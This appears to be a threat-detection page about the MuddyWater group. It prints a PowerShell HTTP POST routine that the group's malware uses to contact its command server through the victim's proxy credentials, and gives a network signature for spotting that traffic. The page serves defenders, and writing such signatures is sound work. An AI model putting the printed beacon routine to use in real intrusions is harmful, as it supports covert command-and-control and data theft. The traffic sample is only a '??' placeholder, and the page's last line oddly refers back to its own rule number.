---
layout: default
---

| Threat |
| ---- |
| Muddywater |

#### 10000011
HTTP POST request constructed by a powershell script deployed onto victims

Powershell uses native windows web request apis

```ps
function httpPOST($url,$enc_msg){ 

	try{
		$content = $enc_msg
		$webreq = [System.Net.WebRequest]::Create($url);
		$webreq.proxy = [Net.WebRequest]::GetSystemWebProxy()
		$webreq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
		$encode_data = [System.Text.Encoding]::UTF8.GetBytes($content);
		$webreq.Method = "POST";
		$webreq.ContentLength = $encode_data.length;
		if ($encode_data.Length -gt 0){
			$req_stream = $webreq.GetRequestStream();
			$req_stream.Write($encode_data, 0, $encode_data.Length);
		}
		[System.Net.WebResponse] $resp = $webreq.GetResponse();
		if ($resp -ne $null){
			$data = $resp.GetResponseStream();
			[System.IO.StreamReader] $res_data = New-Object System.IO.StreamReader $data;
			[String] $result = $res_data.ReadToEnd();

		}
	} catch {
	    $result = ("httpPOST:E:" + $_.Exception.Message)
	}
		 
	return $result
}
```

##### Traffic sample
Taken from sample on [any.run](https://app.any.run/tasks/7a386637-5340-495d-ae0b-79b5544cbfbd/)

```
??
```

Rule targets:

1. Established tcp to server
2. Specific header ordering
3. POST request in uri
4. Regular expression for UUID and folder path generated by powershell script


```c++
flow:established,to_server; http.header_names; content: "|0d 0a|Host|0d 0a|Content-Length|0d 0a|Expect|0d 0a|Connection|0d 0a 0d 0a|"; http.method; content: "POST"; http.uri; pcre: "/^\/[a-z]{2,4}\/[a-fA-F0-9]{32}$/";
```

This rule is seen often in conjuction with 10000011